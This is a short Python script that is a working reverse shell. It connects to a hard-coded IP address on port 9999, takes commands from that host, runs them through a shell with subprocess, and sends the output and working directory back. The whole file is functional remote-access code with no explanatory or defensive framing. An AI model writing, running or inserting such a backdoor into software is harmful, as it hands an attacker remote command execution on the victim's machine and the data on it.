import socket
import subprocess
import os
import time

host = '10.10.60.224'
port = 9999
def create_socket():
    sock = socket.socket()
    print('[+] Initializing socket...')
    try:
        sock.connect((host, port))
        print('[+] Connecting to IP :', host)
        print('[+] Connecting on Port : ', port, '\n')
    except  socket.error as err:
        print('[-] Error in Connecting : ', err)
        print('[+] Re-connecting to the host')
        create_socket()
    recieve_commad(sock)


def recieve_commad(sock):
    while True:
        cmd = sock.recv(1024)
        if cmd[:2].decode("utf-8") == 'cd':
            os.chdir(cmd[3:].decode("utf-8"))
        if len(cmd) > 0:
            output = subprocess.Popen(cmd[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                      stderr=subprocess.PIPE)
            out_bytes = output.stdout.read() + output.stderr.read()
            out_str = str(out_bytes, "utf-8")
            sock.send(str.encode(out_str + str(os.getcwd()) + ' >'))


if __name__ == '__main__':
    create_socket()
